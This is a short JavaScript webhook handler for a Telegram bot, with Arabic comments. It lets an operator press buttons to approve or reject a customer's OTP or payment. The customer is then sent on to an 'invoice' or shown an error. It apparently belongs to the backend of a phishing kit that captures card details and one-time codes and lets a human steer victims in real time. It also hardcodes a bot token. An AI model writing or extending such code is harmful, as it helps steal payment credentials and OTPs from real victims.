global.userStatuses = global.userStatuses || {};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(200).json({ ok: true });

  const update = req.body;

  if (update.callback_query) {
    const callback = update.callback_query;
    const data = callback.data; // مثل approve_otp_xyz123
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
    let responseText = callback.message.text;
    let targetUserId = "";

    if (data.startsWith('approve_otp_') || data.startsWith('approve_pay_')) {
      targetUserId = data.replace('approve_otp_', '').replace('approve_pay_', '');
      global.userStatuses[targetUserId] = 'approved';
      responseText += "\n\n✅ **[تمت الموافقة - تم توجيه العميل للفاتورة]**";
    } else if (data.startsWith('reject_otp_') || data.startsWith('reject_pay_')) {
      targetUserId = data.replace('reject_otp_', '').replace('reject_pay_', '');
      global.userStatuses[targetUserId] = 'rejected';
      responseText += "\n\n❌ **[تم الرفض - تم إظهار خطأ للعميل]**";
    }

    // تعديل الرسالة في تليجرام لإزالة الأزرار وتأكيد القرار
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: responseText,
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك بنجاح!" })
    });
  }

  return res.status(200).json({ ok: true });
}
